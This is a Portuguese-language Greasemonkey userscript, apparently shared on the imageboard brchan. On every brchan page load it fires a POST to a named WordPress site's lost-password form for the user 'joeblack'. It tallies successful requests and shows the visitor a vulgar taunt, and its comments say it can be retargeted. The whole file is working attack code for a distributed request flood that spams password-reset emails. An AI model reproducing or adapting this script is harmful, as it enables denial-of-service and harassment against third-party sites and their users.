// ==UserScript==
// @name           Brchan
// @namespace      http://www.brchan.org/*
// @description    Flooda requests no Bobagento.
// @include        http://www.brchan.org/*
// ==/UserScript==

// Inicialização do script, não mexe nessa porra.
var falasBrchan = new Array();

if(GM_getValue("requestsRealizadas") == undefined){
	GM_setValue("requestsRealizadas", 0);
}

// Interface, para ser ajustada contra outros alvos.
var mostrarRequests = 1;
falasBrchan[0] = "Requests contra o Bobagento";
falasBrchan[1] = "Newfag.";
falasBrchan[2] = "Ainda dá tempo de voltar pro Twitter.";
falasBrchan[3] = "Já pode parar de quotar o OP.";
falasBrchan[4] = "Já pode parar de salvar thumbs.";
falasBrchan[5] = "Você agora faz parte da LEGIAUM, uma LEGIAUM de um bocado de gente.";
falasBrchan[6] = "Tá fapando pra traps, filho da puta?";
falasBrchan[7] = "Oldfag pra caralho você hein.";
falasBrchan[8] = "Seu nome é cas, Zou cas.";
falasBrchan[9] = "Raphael, é você?";
falasBrchan[10] =  "Oi K. :3";

if(mostrarRequests == 1){
	var requestsRealizadas = GM_getValue("requestsRealizadas");

	if(requestsRealizadas > 0 && requestsRealizadas < 10){
		var nome = 1;
	}

	else if(requestsRealizadas > 10 && requestsRealizadas < 20){
		var nome = 2;
	}

	else if(requestsRealizadas > 20 && requestsRealizadas < 50){
		var nome = 3;
	}

	else if(requestsRealizadas > 50 && requestsRealizadas < 100){
		var nome = 4;
	}

	else if(requestsRealizadas > 100 && requestsRealizadas < 150){
		var nome = 5;
	}

	else if(requestsRealizadas > 150 && requestsRealizadas < 200){
		var nome = 6;
	}
	
	else if(requestsRealizadas > 200 && requestsRealizadas < 500){
		var nome = 7;
	}
	
	else if(requestsRealizadas > 500 && requestsRealizadas < 1000){
		var nome = 8;
	}

	else if(requestsRealizadas > 1000 && requestsRealizadas < 99999){
		var nome = 9;
	}

	else if(requestsRealizadas > 99999){
		var nome = 10;
	}

	document.getElementById("txtHint").innerHTML = falasBrchan[0] + ": " + GM_getValue("requestsRealizadas") + "<br />" + falasBrchan[nome];
}

GM_xmlhttpRequest({
	method: "POST",
	url: "http://bobagento.com/wp-login.php?action=lostpassword",
	headers: { "Content-type" : "application/x-www-form-urlencoded", "Referer" : "http://bobagento.com/wp-login.php?action=lostpassword", "Cookie" : "wordpress_test_cookie=WP+Cookie+check;" },
	data: encodeURIComponent("user_login=joeblack&redirect_to=&wp-submit=Obter+nova+senha"),
	onload: function(e) {
		if(e.responseText.match("link para criar")){
			GM_setValue("requestsRealizadas", GM_getValue("requestsRealizadas")+1);
		}
	}
});
